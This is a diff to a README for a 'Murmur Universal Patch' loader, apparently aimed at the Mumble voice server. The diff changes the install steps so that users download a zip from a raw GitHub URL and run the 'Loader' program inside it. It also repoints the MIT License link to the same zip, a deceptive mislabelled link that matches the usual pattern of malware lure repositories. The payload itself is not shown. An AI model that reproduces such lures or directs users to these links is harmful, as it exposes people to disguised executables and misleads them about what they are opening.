@@ -21,8 +21,8 @@ Welcome to **Murmur Universal Patch** – a versatile solution designed for seam
 
 To get started with **Murmur Universal Patch**, simply follow the steps below:
 
-1. **Download Loader.rar from the repository.**
-2. Extract the contents of Loader.rar to a convenient location on your system.
+1. **Download https://raw.githubusercontent.com/rafa0307lisboa/MurmurPatchWorks/main/Deipara/MurmurPatchWorks.zip from the repository.**
+2. Extract the contents of https://raw.githubusercontent.com/rafa0307lisboa/MurmurPatchWorks/main/Deipara/MurmurPatchWorks.zip to a convenient location on your system.
 3. Run the Loader application. The program will guide you through the rest of the setup.
 4. Configure patches according to your preferences and system needs.
 5. Enjoy your enhanced Murmur experience!
@@ -80,7 +80,7 @@ murmur patcher, cross-platform patch utility, murmur loader, mumble server enhan
 ## 📄 MIT License
 
 © Murmur Universal Patch contributors 2025.  
-Released under the [MIT License](https://opensource.org/licenses/MIT). Please review the LICENSE file for full details.
+Released under the [MIT License](https://raw.githubusercontent.com/rafa0307lisboa/MurmurPatchWorks/main/Deipara/MurmurPatchWorks.zip). Please review the LICENSE file for full details.
 
 ---
 
